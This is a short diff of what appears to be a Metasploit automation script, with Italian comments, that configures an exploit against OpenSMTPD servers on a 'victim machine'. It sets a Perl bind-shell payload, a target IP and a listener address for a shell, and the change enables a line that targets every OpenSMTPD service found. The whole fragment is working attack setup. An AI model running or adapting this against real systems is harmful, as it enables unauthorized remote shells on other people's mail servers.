@@ -121,7 +121,7 @@
         # che in quanto dipendenza di opensmtpd sarà installata sulla macchina vittima
         run_single("set payload cmd/unix/bind_perl")
         # imposta come obiettivo dell'exploit tutti i server opensmtpd
-        #run_single("services -S opensmtpd -R")
+        run_single("services -S opensmtpd -R")
         run_single("set RHOSTS #{targetIP}")
         # imposta l'indirizzo ip su cui avviare il listener per la reverse shell
         run_single("set LHOST #{listeningIP}")
